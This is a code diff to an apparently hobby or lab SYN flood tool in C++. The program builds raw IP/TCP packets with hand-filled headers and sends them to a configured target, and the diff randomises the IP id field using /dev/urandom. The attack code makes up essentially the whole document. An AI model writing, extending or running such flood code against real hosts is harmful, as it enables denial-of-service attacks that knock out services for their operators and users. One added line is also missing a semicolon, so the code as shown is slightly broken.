@@ -1,5 +1,7 @@
 #include "tcp_synflood.h"
 
+using namespace std;
+
 struct pseudo_header
 {
 	unsigned int source_address;
@@ -14,11 +16,6 @@ int main(int argc, char *argv[])
 {
     SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 
-    char packet[PACKET_SIZE], *data;
-    IPHDR* ip_header = (IPHDR*)packet;
-    TCPHDR* tcp_header = (TCPHDR*)(packet + sizeof(struct ip));
-    SOCKADDR_IN sin;
-    
     if (socket_fd == SOCKET_ERROR)
     {
         printf("Socket creation failed.\n");
@@ -26,7 +23,10 @@ int main(int argc, char *argv[])
     }
     else
     {
-        printf("socket ok\n");
+        char packet[PACKET_SIZE], *data;
+        IPHDR* ip_header = (IPHDR*)packet;
+        TCPHDR* tcp_header = (TCPHDR*)(packet + sizeof(struct ip));
+        SOCKADDR_IN sin;
 
         int one = 1;
         if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
@@ -36,16 +36,16 @@ int main(int argc, char *argv[])
         }
         else
         {
-            memset(packet, 0, PACKET_SIZE);
-            fill_ip_header(ip_header);
-            fill_tcp_header(tcp_header, 0);
-
-            sin.sin_family = AF_INET;
-            sin.sin_port = htons(DST_PORT);
-            sin.sin_addr.s_addr = inet_addr(DST_IP);
-
             for(int i = 0; i < 10; i++)
             {
+                memset(packet, 0, PACKET_SIZE);
+                fill_ip_header(ip_header);
+                fill_tcp_header(tcp_header, 0);
+
+                sin.sin_family = AF_INET;
+                sin.sin_port = htons(DST_PORT);
+                sin.sin_addr.s_addr = inet_addr(DST_IP);
+
                 if (sendto(socket_fd, packet, ip_header->tot_len, 0, (SOCKADDR *) &sin, sizeof(sin)) < 0)
 		        {
 			        printf("Error while sending packet.\n");
@@ -54,7 +54,7 @@ int main(int argc, char *argv[])
 		        else
 		        {
 			        printf("Packet sent successfully !\n");
-                    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+                    this_thread::sleep_for(chrono::milliseconds(1000));
 		        }
             }
         }
@@ -65,11 +65,13 @@ int main(int argc, char *argv[])
 
 void fill_ip_header(IPHDR *ip_header)
 {
+    unsigned short packet_id = get_rand();
+
     ip_header->version = 4;
     ip_header->ihl = 5;
     ip_header->tos = 0;
     ip_header->tot_len = sizeof(IPHDR) + sizeof(TCPHDR);
-    ip_header->id = htons(54321);
+    ip_header->id = htons(packet_id);
     ip_header->frag_off = 0;
     ip_header->ttl = 64;
     ip_header->protocol = IPPROTO_TCP;
@@ -139,4 +141,23 @@ unsigned short csum(unsigned short *ptr,int nbytes)
 	answer = (short)~sum;
 	
 	return(answer);
+}
+
+unsigned short get_rand()
+{
+    unsigned short random_value = 0;
+    size_t size = sizeof(random_value);
+    ifstream urandom("/dev/urandom", ios::in | ios::binary);
+    if(urandom)
+    {
+        urandom.read(reinterpret_cast<char*>(&random_value), size);
+        urandom.close();
+    }
+    else
+    {
+        cerr << "Failed to open stream /dev/urandom" << endl;
+        random_value = 35789
+    }
+
+    return random_value;
 }
